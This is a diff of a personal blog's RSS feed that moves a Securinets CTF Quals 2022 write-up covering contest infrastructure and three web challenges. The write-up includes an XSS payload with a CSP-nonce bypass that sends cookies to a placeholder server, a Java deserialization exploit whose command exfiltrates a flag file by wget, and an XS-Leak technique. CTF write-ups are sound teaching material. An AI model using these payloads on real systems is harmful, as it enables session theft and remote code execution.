@@ -5,220 +5,12 @@
     <link>https://ahmed-belkahla.me/post/</link>
       <atom:link href="https://ahmed-belkahla.me/post/index.xml" rel="self" type="application/rss+xml" />
     <description>Posts</description>
-    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><copyright>© Ahmed Belkahla, 2022</copyright><lastBuildDate>Thu, 14 Apr 2022 00:00:00 +0000</lastBuildDate>
+    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><copyright>© Ahmed Belkahla, 2022</copyright><lastBuildDate>Tue, 12 Oct 2021 00:00:00 +0000</lastBuildDate>
     <image>
       <url>https://ahmed-belkahla.me/img/me.jpg</url>
       <title>Posts</title>
       <link>https://ahmed-belkahla.me/post/</link>
     </image>
-    
-    <item>
-      <title>Securinets CTF Quals 2022 - Infrastructure and Web writeups</title>
-      <link>https://ahmed-belkahla.me/post/securinetsquals/</link>
-      <pubDate>Thu, 14 Apr 2022 00:00:00 +0000</pubDate>
-      <guid>https://ahmed-belkahla.me/post/securinetsquals/</guid>
-      <description>&lt;p&gt;The last weekend we organised Securinets CTF Quals 2022, which is the most prestigious CTF in Tunisia and one of the most internationally known CTFs, this year we will reach around 70 weight after the positive feedbacks which is a huge achievement.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/NYhqlD8.png&#34; alt=&#34;CTFTIME&#34;&gt;&lt;/p&gt;
-&lt;p&gt;As Securinets Technical director I was in charge of managing the CTF, I took care of the Infrastructure and wrote 3 web challenges. In this article we will talk about some infrastructure details and the solutions of my web challenges.
-1-Infrastructure
-2-Planet sheet Writeup (XSS with CSP Bypass)
-3-BrokenParrot Writeup (Custom Java Deserialization Gadget)
-4-NarutoKeeper Writeup (XSLeak Challenge)&lt;/p&gt;
-&lt;h2 id=&#34;infrastructure&#34;&gt;Infrastructure&lt;/h2&gt;
-&lt;p&gt;We knew that a huge number will participate so we tried to anticipate in order to have a stable infrastructure. We opted for the following architecture:&lt;/p&gt;
-&lt;p&gt;A separated instance for the Database and an instance for the platform. I used docker swarm ( 4 containers ) and Traefik as a load balancer to ensure a certain level of scalability. This was the final docker-compose:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-yaml&#34;&gt;version: &#39;3.8&#39;
-
-services:
-  ctfd:
-    image: 127.0.0.1:2000/qualsplat
-    build: .
-    user: root
-    restart: always
-    ports:
-      - &amp;quot;8000:8000&amp;quot;
-    environment:
-      - DATABASE_URL=mysql+pymysql://ctfd:REDACTED@IP/ctfd
-      - SECRET_KEY=REDACTED
-      - REDIS_URL=redis://cache:6379
-      - WORKERS=6
-      - LOG_FOLDER=/var/log/CTFd
-      - SQLALCHEMY_MAX_OVERFLOW=800
-      - SQLALCHEMY_POOL_PRE_PING=True
-      - ACCESS_LOG=-
-      - ERROR_LOG=-
-      - REVERSE_PROXY=true
- #   volumes:
- #     - /logs:/var/log/CTFd
- #     - /opt/CTFd:/opt/CTFd:ro
-    deploy:
-      replicas: 4
-      placement:
-        max_replicas_per_node: 4
-      labels:
-        - &amp;quot;traefik.enable=true&amp;quot;
-        - &amp;quot;traefik.http.routers.ctfd.rule=Host(`20.231.33.243`) || Host(`www.ctfsecurinets.tech`) || Host(`ctfsecurinets.tech`)&amp;quot;
-        - &amp;quot;traefik.http.routers.ctfd.entrypoints=web&amp;quot;
-        - &amp;quot;traefik.http.services.ctfd.loadbalancer.server.port=8000&amp;quot;
-        - &amp;quot;traefik.http.services.ctfd.loadbalancer.sticky=true&amp;quot;
-        - &amp;quot;traefik.http.services.ctfd.loadbalancer.sticky.cookie.name=StickyCookie&amp;quot;
-    networks:
-        net:
-        internal:
-
-
-  loadbalancer:
-    image: traefik:v2.2
-    command: 
-      - &amp;quot;--log.level=ERROR&amp;quot;
-      - &amp;quot;--api.insecure=true&amp;quot;
-      - &amp;quot;--providers.docker.swarmMode=true&amp;quot;
-      - &amp;quot;--providers.docker.network=quals_net&amp;quot;
-      - &amp;quot;--providers.docker.exposedbydefault=false&amp;quot;
-      - &amp;quot;--entrypoints.web.address=:80&amp;quot;
-    ports:
-      - 80:80
-      - 9000:8080
-      - 5000:5000
-    network_mode: &amp;quot;host&amp;quot;
-    deploy:
-      restart_policy:
-        condition: any
-      mode: replicated
-      placement:
-        constraints:
-          - &amp;quot;node.role==manager&amp;quot;
-         max_replicas_per_node: 1
-      replicas: 1
-      update_config:
-        delay: 2s
-    volumes:
-      - /var/run/docker.sock:/var/run/docker.sock
-    networks:
-        net:
-
-networks:
-    default:
-    internal:
-        internal: true
-    net:
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h3 id=&#34;monitoring&#34;&gt;Monitoring&lt;/h3&gt;
-&lt;p&gt;For monitoring and alerting I inspired from @theoremoon san in Zer0ptsCTF and used 
-&lt;a href=&#34;https://mackerel.io&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Mackerel&lt;/a&gt; .&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/BHHTuwV.png&#34; alt=&#34;DASHBOARD&#34;&gt;&lt;/p&gt;
-&lt;p&gt;It is easy to setup and supports alerting via different channels ( including Discord ) so I installed the agent in the most critical servers of the infra which helped us a lot in handling and anticipating the different issues.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/82gqHiE.png&#34; alt=&#34;MONITOR&#34;&gt;&lt;/p&gt;
-&lt;p&gt;In case of any alerts we receive a similar message in discord:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/hiKJuMO.png&#34; alt=&#34;ALERT&#34;&gt;&lt;/p&gt;
-&lt;h1 id=&#34;web-challenges-writeup&#34;&gt;Web Challenges Writeup:&lt;/h1&gt;
-&lt;h2 id=&#34;planet-sheet&#34;&gt;Planet sheet:&lt;/h2&gt;
-&lt;p&gt;I thought that this challenge will be a good warm up but some players ended up having some troubles with it. Visiting the website we can notice /show.php page that has a src parameter getting reflected directly in the page:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/7zGxIBp.png&#34; alt=&#34;REFLECTED&#34;&gt;&lt;/p&gt;
-&lt;p&gt;We can notice that the Content-Type is &lt;strong&gt;text/xsl&lt;/strong&gt; so usual script tags won&amp;rsquo;t work here since it&amp;rsquo;s not rendered as an HTML Page.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/ikGS9Pk.png&#34; alt=&#34;CT&#34;&gt;
-So we will use the following payload to execute JS code.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;&amp;lt;x:script xmlns:x=&amp;quot;http://www.w3.org/1999/xhtml&amp;quot;&amp;gt;alert(document.domain)&amp;lt;/x:script&amp;gt;
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;A keen eye may have already noticed the CSP. For the first time it may appear as a strict policy protected by nonces but if we refresh the page for a few times, we can see that the nonce is fixed thus we can reuse it here.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;&amp;lt;x:script nonce=&amp;quot;Y8Ret8N5CPXrSG&amp;quot; xmlns:x=&amp;quot;http://www.w3.org/1999/xhtml&amp;quot;&amp;gt;fetch(&amp;quot;http://Your_Server?a=&amp;quot;+document.cookie)&amp;lt;/x:script&amp;gt;
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&#34;brokenparr0t&#34;&gt;BrokenParr0t&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/UFecnMQ.png&#34; alt=&#34;CARD&#34;&gt;&lt;/p&gt;
-&lt;p&gt;I was lately interested in Java Deserialization custom gadget chains and done a lot of researchs on this subject, my first attempt was in FwordCTF 2021 where I created Parrot challenge (
-&lt;a href=&#34;https://exti0p.github.io/ctf/2021/FwordCTF/web/parrotox.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Writeup&lt;/a&gt; If you are interested) and in Securinets Quals I decided to try another idea with some new gadget types.
-As always, we have given the source code to the participants. After decompiling the jar file with jd-gui, we can explore the different classes of the application. At first glance, we can notice the arbitrary java deserialization in the /latest_question endpoint but we can notice that the input is handled first by a class Security.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/HlkSnEl.png&#34; alt=&#34;SOURCE&#34;&gt;&lt;/p&gt;
-&lt;p&gt;Digging in Security class we see that it&amp;rsquo;s restricting the deserialization of only the classes in com.securinets.utils  and java.(.*) packages.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Rab6YyP.png&#34; alt=&#34;SECURITY&#34;&gt;&lt;/p&gt;
-&lt;p&gt;It&amp;rsquo;s pretty obvious that we manually need to craft the gadget chain to achieve RCE since automated tools won&amp;rsquo;t work here. We can see that com.securinets.utils.QuestionCompar is overriding compare method and deserializing the value of &lt;strong&gt;internal&lt;/strong&gt; attribute after Base64 decoding it. The deserialized object here is also restricted by another class called LooseSecurity which let us deserialize classes from com.securinets package, so the scope to search for gadgets is bigger.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Zzk0BHQ.png&#34; alt=&#34;JAVA&#34;&gt;&lt;/p&gt;
-&lt;p&gt;The idea here is to PriorityQueue class in java.util with the custom comparator QuestionCompar as an entry gadget. If we dig in PriorityQueue source code in jdk, we see that when it&amp;rsquo;s deserialized it calls the method heapify 
-&lt;a href=&#34;http://hg.openjdk.java.net/jdk8/jdk8/jdk/file/687fd7c7986d/src/share/classes/java/util/PriorityQueue.java#l779&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;L779&lt;/a&gt;, heapify method will also call siftdown 
-&lt;a href=&#34;http://hg.openjdk.java.net/jdk8/jdk8/jdk/file/687fd7c7986d/src/share/classes/java/util/PriorityQueue.java#l734&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;L734&lt;/a&gt; that will call siftdown 
-&lt;a href=&#34;http://hg.openjdk.java.net/jdk8/jdk8/jdk/file/687fd7c7986d/src/share/classes/java/util/PriorityQueue.java#l685&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;L695&lt;/a&gt;. finally since we have provided a custom comparator, siftDownUsingComparator method will call the overriden compare method in QuestionCompa comparator 
-&lt;a href=&#34;http://hg.openjdk.java.net/jdk8/jdk8/jdk/file/687fd7c7986d/src/share/classes/java/util/PriorityQueue.java#l712&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;L712&lt;/a&gt;.
-Now for the last piece, we can take a look at the serializable class com.securinets.services.Author that is calling compute method as follow:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Fr9jBpn.png&#34; alt=&#34;AUTHOR&#34;&gt;&lt;/p&gt;
-&lt;p&gt;We need to set uuid attribute to a value that has a hashcode equal to 0 (f5a5a608), and name attribute to our final payload that reads the flag.&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;import com.securinets.services.Author;
-import com.securinets.utils.QuestionCompar;
-
-import java.io.ByteArrayOutputStream;
-import java.io.FileOutputStream;
-import java.io.ObjectOutputStream;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.Field;
-import java.util.Base64;
-import java.util.Comparator;
-import java.util.PriorityQueue;
-
-public class Exp {
-    public Exp() {
-    }
-
-    public static void main(String[] var0) {
-        try {
-//second object
-            Author auth = new Author();
-            Field uuid = Author.class.getDeclaredField(&amp;quot;uuid&amp;quot;);
-            uuid.setAccessible(true);
-            uuid.set(auth, new String(&amp;quot;f5a5a608&amp;quot;));
-            Field name = Author.class.getDeclaredField(&amp;quot;name&amp;quot;);
-            name.setAccessible(true);
-            name.set(auth, new String(&amp;quot;sh -c $@|sh . echo wget http://Your_Server?a=$(cat /flag.txt|base64|tr -d \&amp;quot;\n\&amp;quot;)&amp;quot;));
-            final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
-            final ObjectOutputStream objectOutputStream;
-            objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
-            objectOutputStream.writeObject(auth);
-            objectOutputStream.close();
-            String secondSerial = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
-
-            Constructor ctor =  QuestionCompar.class.getDeclaredConstructor();
-            ctor.setAccessible(true);
-            Comparator comparator=(Comparator) ctor.newInstance();
-            Field var1 = QuestionCompar.class.getDeclaredField(&amp;quot;internal&amp;quot;);
-            var1.setAccessible(true);
-            var1.set(comparator, secondSerial);
-            final PriorityQueue&amp;lt;Object&amp;gt; queue = new PriorityQueue&amp;lt;Object&amp;gt;(2, comparator);
-            queue.add(new String(&amp;quot;1&amp;quot;));
-            queue.add(new String(&amp;quot;1&amp;quot;));
-
-
-            FileOutputStream fileOutputStream
-                    = new FileOutputStream(&amp;quot;result&amp;quot;);
-            ObjectOutputStream oos
-                    = new ObjectOutputStream(fileOutputStream);
-            oos.writeObject(queue);
-            oos.flush();
-            oos.close();
-
-            System.out.println(&amp;quot;Object has been serialized&amp;quot;);
-        } catch (Exception var6) {
-            System.out.println(&amp;quot;IOException is caught&amp;quot;);
-	    var6.printStackTrace();
-        }
-    }
-}
-
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;In a nutshell, this exploit starts by creating a ProprityQueue object implementing QuestionCompar as a custom comparator after setting the internal attribute to the value of Author class serialized and Base64 encoded.&lt;/p&gt;
-&lt;h2 id=&#34;narutokeeper&#34;&gt;NarutoKeeper&lt;/h2&gt;
-&lt;p&gt;XSLeak vulnerability attracted me a lot lately so as a ritual I&amp;rsquo;m publishing a different challenge about this vulnerability in every CTF. This particular challenge was meant to be harder, but due to a little mistake it was solved with another technique, so I decided to keep the intended solution for a future CTF since it&amp;rsquo;s worth the effort.
-&lt;img src=&#34;https://i.imgur.com/is1Wwwa.png&#34; alt=&#34;TASK&#34;&gt;
-As every XSLeak challenge we need to leak the flag from a cross origin context. Here in the search endpoint we can notice that is the answer is correct we will be redirected to /view endpoint otherwise we will receive a no results message. So if we detect if the redirect has happened or not in cross origin, we will manage to exfiltrate the flag char by char.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/gx6QDgF.png&#34; alt=&#34;SEARCH&#34;&gt;&lt;/p&gt;
-&lt;p&gt;In fact, fetch throws an error if we exceed 20 redirects, so the idea is to redirect the admin to our controlled website 19 times and in the 20th redirect we initiate our search request, thus if the char is correct we will be redirected to /view so we will have a network error since we exceeded the possible 20 redirect otherwise network error won&amp;rsquo;t be triggered.
-You can check the following &lt;strong&gt;
-&lt;a href=&#34;https://ctf.zeyu2001.com/2022/securinets-ctf-quals-2022/narutokeeper&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Writeup&lt;/a&gt;&lt;/strong&gt; and exploit by zeyu2001 for example.&lt;/p&gt;
-&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
-&lt;p&gt;We hope that everyone enjoyed this edition of Securinets Quals, we were very happy to reach 70 weight in CTFTime so we are now the most rated CTF in MENA Region. We can&amp;rsquo;t wait to see everyone in the finals so soon!&lt;/p&gt;
-</description>
-    </item>
     
     <item>
       <title>PBCTF 2021 - RCE 0-Day in Goahead Webserver</title>
@@ -3008,6 +2800,214 @@ that automates this and FINALLY we got The flag :&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;*** Conclusion ***&lt;/p&gt;
 &lt;p&gt;I hope you liked this task , it took me 4 continuous days of hard work to implement this idea ( i had to write a big part of jwt generator ) you can find the source code in the same directory ! Anyways dont forget to star me and if you faced any problems please contact me!&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Securinets CTF Quals 2022 - Infrastructure and Web writeups</title>
+      <link>https://ahmed-belkahla.me/post/securinetsquals/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://ahmed-belkahla.me/post/securinetsquals/</guid>
+      <description>&lt;p&gt;The last weekend we organised Securinets CTF Quals 2022, which is the most prestigious CTF in Tunisia and one of the most internationally known CTFs, this year we will reach around 70 weight after the positive feedbacks which is a huge achievement.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/NYhqlD8.png&#34; alt=&#34;CTFTIME&#34;&gt;&lt;/p&gt;
+&lt;p&gt;As Securinets Technical director I was in charge of managing the CTF, I took care of the Infrastructure and wrote 3 web challenges. In this article we will talk about some infrastructure details and the solutions of my web challenges.
+1-Infrastructure
+2-Planet sheet Writeup (XSS with CSP Bypass)
+3-BrokenParrot Writeup (Custom Java Deserialization Gadget)
+4-NarutoKeeper Writeup (XSLeak Challenge)&lt;/p&gt;
+&lt;h2 id=&#34;infrastructure&#34;&gt;Infrastructure&lt;/h2&gt;
+&lt;p&gt;We knew that a huge number will participate so we tried to anticipate in order to have a stable infrastructure. We opted for the following architecture:&lt;/p&gt;
+&lt;p&gt;A separated instance for the Database and an instance for the platform. I used docker swarm ( 4 containers ) and Traefik as a load balancer to ensure a certain level of scalability. This was the final docker-compose:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-yaml&#34;&gt;version: &#39;3.8&#39;
+
+services:
+  ctfd:
+    image: 127.0.0.1:2000/qualsplat
+    build: .
+    user: root
+    restart: always
+    ports:
+      - &amp;quot;8000:8000&amp;quot;
+    environment:
+      - DATABASE_URL=mysql+pymysql://ctfd:REDACTED@IP/ctfd
+      - SECRET_KEY=REDACTED
+      - REDIS_URL=redis://cache:6379
+      - WORKERS=6
+      - LOG_FOLDER=/var/log/CTFd
+      - SQLALCHEMY_MAX_OVERFLOW=800
+      - SQLALCHEMY_POOL_PRE_PING=True
+      - ACCESS_LOG=-
+      - ERROR_LOG=-
+      - REVERSE_PROXY=true
+ #   volumes:
+ #     - /logs:/var/log/CTFd
+ #     - /opt/CTFd:/opt/CTFd:ro
+    deploy:
+      replicas: 4
+      placement:
+        max_replicas_per_node: 4
+      labels:
+        - &amp;quot;traefik.enable=true&amp;quot;
+        - &amp;quot;traefik.http.routers.ctfd.rule=Host(`20.231.33.243`) || Host(`www.ctfsecurinets.tech`) || Host(`ctfsecurinets.tech`)&amp;quot;
+        - &amp;quot;traefik.http.routers.ctfd.entrypoints=web&amp;quot;
+        - &amp;quot;traefik.http.services.ctfd.loadbalancer.server.port=8000&amp;quot;
+        - &amp;quot;traefik.http.services.ctfd.loadbalancer.sticky=true&amp;quot;
+        - &amp;quot;traefik.http.services.ctfd.loadbalancer.sticky.cookie.name=StickyCookie&amp;quot;
+    networks:
+        net:
+        internal:
+
+
+  loadbalancer:
+    image: traefik:v2.2
+    command: 
+      - &amp;quot;--log.level=ERROR&amp;quot;
+      - &amp;quot;--api.insecure=true&amp;quot;
+      - &amp;quot;--providers.docker.swarmMode=true&amp;quot;
+      - &amp;quot;--providers.docker.network=quals_net&amp;quot;
+      - &amp;quot;--providers.docker.exposedbydefault=false&amp;quot;
+      - &amp;quot;--entrypoints.web.address=:80&amp;quot;
+    ports:
+      - 80:80
+      - 9000:8080
+      - 5000:5000
+    network_mode: &amp;quot;host&amp;quot;
+    deploy:
+      restart_policy:
+        condition: any
+      mode: replicated
+      placement:
+        constraints:
+          - &amp;quot;node.role==manager&amp;quot;
+         max_replicas_per_node: 1
+      replicas: 1
+      update_config:
+        delay: 2s
+    volumes:
+      - /var/run/docker.sock:/var/run/docker.sock
+    networks:
+        net:
+
+networks:
+    default:
+    internal:
+        internal: true
+    net:
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;monitoring&#34;&gt;Monitoring&lt;/h3&gt;
+&lt;p&gt;For monitoring and alerting I inspired from @theoremoon san in Zer0ptsCTF and used 
+&lt;a href=&#34;https://mackerel.io&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Mackerel&lt;/a&gt; .&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/BHHTuwV.png&#34; alt=&#34;DASHBOARD&#34;&gt;&lt;/p&gt;
+&lt;p&gt;It is easy to setup and supports alerting via different channels ( including Discord ) so I installed the agent in the most critical servers of the infra which helped us a lot in handling and anticipating the different issues.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/82gqHiE.png&#34; alt=&#34;MONITOR&#34;&gt;&lt;/p&gt;
+&lt;p&gt;In case of any alerts we receive a similar message in discord:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/hiKJuMO.png&#34; alt=&#34;ALERT&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;web-challenges-writeup&#34;&gt;Web Challenges Writeup:&lt;/h1&gt;
+&lt;h2 id=&#34;planet-sheet&#34;&gt;Planet sheet:&lt;/h2&gt;
+&lt;p&gt;I thought that this challenge will be a good warm up but some players ended up having some troubles with it. Visiting the website we can notice /show.php page that has a src parameter getting reflected directly in the page:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/7zGxIBp.png&#34; alt=&#34;REFLECTED&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We can notice that the Content-Type is &lt;strong&gt;text/xsl&lt;/strong&gt; so usual script tags won&amp;rsquo;t work here since it&amp;rsquo;s not rendered as an HTML Page.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/ikGS9Pk.png&#34; alt=&#34;CT&#34;&gt;
+So we will use the following payload to execute JS code.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;x:script xmlns:x=&amp;quot;http://www.w3.org/1999/xhtml&amp;quot;&amp;gt;alert(document.domain)&amp;lt;/x:script&amp;gt;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;A keen eye may have already noticed the CSP. For the first time it may appear as a strict policy protected by nonces but if we refresh the page for a few times, we can see that the nonce is fixed thus we can reuse it here.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;x:script nonce=&amp;quot;Y8Ret8N5CPXrSG&amp;quot; xmlns:x=&amp;quot;http://www.w3.org/1999/xhtml&amp;quot;&amp;gt;fetch(&amp;quot;http://Your_Server?a=&amp;quot;+document.cookie)&amp;lt;/x:script&amp;gt;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;brokenparr0t&#34;&gt;BrokenParr0t&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/UFecnMQ.png&#34; alt=&#34;CARD&#34;&gt;&lt;/p&gt;
+&lt;p&gt;I was lately interested in Java Deserialization custom gadget chains and done a lot of researchs on this subject, my first attempt was in FwordCTF 2021 where I created Parrot challenge (
+&lt;a href=&#34;https://exti0p.github.io/ctf/2021/FwordCTF/web/parrotox.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Writeup&lt;/a&gt; If you are interested) and in Securinets Quals I decided to try another idea with some new gadget types.
+As always, we have given the source code to the participants. After decompiling the jar file with jd-gui, we can explore the different classes of the application. At first glance, we can notice the arbitrary java deserialization in the /latest_question endpoint but we can notice that the input is handled first by a class Security.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/HlkSnEl.png&#34; alt=&#34;SOURCE&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Digging in Security class we see that it&amp;rsquo;s restricting the deserialization of only the classes in com.securinets.utils  and java.(.*) packages.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Rab6YyP.png&#34; alt=&#34;SECURITY&#34;&gt;&lt;/p&gt;
+&lt;p&gt;It&amp;rsquo;s pretty obvious that we manually need to craft the gadget chain to achieve RCE since automated tools won&amp;rsquo;t work here. We can see that com.securinets.utils.QuestionCompar is overriding compare method and deserializing the value of &lt;strong&gt;internal&lt;/strong&gt; attribute after Base64 decoding it. The deserialized object here is also restricted by another class called LooseSecurity which let us deserialize classes from com.securinets package, so the scope to search for gadgets is bigger.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Zzk0BHQ.png&#34; alt=&#34;JAVA&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The idea here is to PriorityQueue class in java.util with the custom comparator QuestionCompar as an entry gadget. If we dig in PriorityQueue source code in jdk, we see that when it&amp;rsquo;s deserialized it calls the method heapify 
+&lt;a href=&#34;http://hg.openjdk.java.net/jdk8/jdk8/jdk/file/687fd7c7986d/src/share/classes/java/util/PriorityQueue.java#l779&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;L779&lt;/a&gt;, heapify method will also call siftdown 
+&lt;a href=&#34;http://hg.openjdk.java.net/jdk8/jdk8/jdk/file/687fd7c7986d/src/share/classes/java/util/PriorityQueue.java#l734&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;L734&lt;/a&gt; that will call siftdown 
+&lt;a href=&#34;http://hg.openjdk.java.net/jdk8/jdk8/jdk/file/687fd7c7986d/src/share/classes/java/util/PriorityQueue.java#l685&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;L695&lt;/a&gt;. finally since we have provided a custom comparator, siftDownUsingComparator method will call the overriden compare method in QuestionCompa comparator 
+&lt;a href=&#34;http://hg.openjdk.java.net/jdk8/jdk8/jdk/file/687fd7c7986d/src/share/classes/java/util/PriorityQueue.java#l712&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;L712&lt;/a&gt;.
+Now for the last piece, we can take a look at the serializable class com.securinets.services.Author that is calling compute method as follow:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Fr9jBpn.png&#34; alt=&#34;AUTHOR&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We need to set uuid attribute to a value that has a hashcode equal to 0 (f5a5a608), and name attribute to our final payload that reads the flag.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;import com.securinets.services.Author;
+import com.securinets.utils.QuestionCompar;
+
+import java.io.ByteArrayOutputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.util.Base64;
+import java.util.Comparator;
+import java.util.PriorityQueue;
+
+public class Exp {
+    public Exp() {
+    }
+
+    public static void main(String[] var0) {
+        try {
+//second object
+            Author auth = new Author();
+            Field uuid = Author.class.getDeclaredField(&amp;quot;uuid&amp;quot;);
+            uuid.setAccessible(true);
+            uuid.set(auth, new String(&amp;quot;f5a5a608&amp;quot;));
+            Field name = Author.class.getDeclaredField(&amp;quot;name&amp;quot;);
+            name.setAccessible(true);
+            name.set(auth, new String(&amp;quot;sh -c $@|sh . echo wget http://Your_Server?a=$(cat /flag.txt|base64|tr -d \&amp;quot;\n\&amp;quot;)&amp;quot;));
+            final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+            final ObjectOutputStream objectOutputStream;
+            objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+            objectOutputStream.writeObject(auth);
+            objectOutputStream.close();
+            String secondSerial = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
+
+            Constructor ctor =  QuestionCompar.class.getDeclaredConstructor();
+            ctor.setAccessible(true);
+            Comparator comparator=(Comparator) ctor.newInstance();
+            Field var1 = QuestionCompar.class.getDeclaredField(&amp;quot;internal&amp;quot;);
+            var1.setAccessible(true);
+            var1.set(comparator, secondSerial);
+            final PriorityQueue&amp;lt;Object&amp;gt; queue = new PriorityQueue&amp;lt;Object&amp;gt;(2, comparator);
+            queue.add(new String(&amp;quot;1&amp;quot;));
+            queue.add(new String(&amp;quot;1&amp;quot;));
+
+
+            FileOutputStream fileOutputStream
+                    = new FileOutputStream(&amp;quot;result&amp;quot;);
+            ObjectOutputStream oos
+                    = new ObjectOutputStream(fileOutputStream);
+            oos.writeObject(queue);
+            oos.flush();
+            oos.close();
+
+            System.out.println(&amp;quot;Object has been serialized&amp;quot;);
+        } catch (Exception var6) {
+            System.out.println(&amp;quot;IOException is caught&amp;quot;);
+	    var6.printStackTrace();
+        }
+    }
+}
+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;In a nutshell, this exploit starts by creating a ProprityQueue object implementing QuestionCompar as a custom comparator after setting the internal attribute to the value of Author class serialized and Base64 encoded.&lt;/p&gt;
+&lt;h2 id=&#34;narutokeeper&#34;&gt;NarutoKeeper&lt;/h2&gt;
+&lt;p&gt;XSLeak vulnerability attracted me a lot lately so as a ritual I&amp;rsquo;m publishing a different challenge about this vulnerability in every CTF. This particular challenge was meant to be harder, but due to a little mistake it was solved with another technique, so I decided to keep the intended solution for a future CTF since it&amp;rsquo;s worth the effort.
+&lt;img src=&#34;https://i.imgur.com/is1Wwwa.png&#34; alt=&#34;TASK&#34;&gt;
+As every XSLeak challenge we need to leak the flag from a cross origin context. Here in the search endpoint we can notice that is the answer is correct we will be redirected to /view endpoint otherwise we will receive a no results message. So if we detect if the redirect has happened or not in cross origin, we will manage to exfiltrate the flag char by char.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/gx6QDgF.png&#34; alt=&#34;SEARCH&#34;&gt;&lt;/p&gt;
+&lt;p&gt;In fact, fetch throws an error if we exceed 20 redirects, so the idea is to redirect the admin to our controlled website 19 times and in the 20th redirect we initiate our search request, thus if the char is correct we will be redirected to /view so we will have a network error since we exceeded the possible 20 redirect otherwise network error won&amp;rsquo;t be triggered.
+You can check the following &lt;strong&gt;
+&lt;a href=&#34;https://ctf.zeyu2001.com/2022/securinets-ctf-quals-2022/narutokeeper&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Writeup&lt;/a&gt;&lt;/strong&gt; and exploit by zeyu2001 for example.&lt;/p&gt;
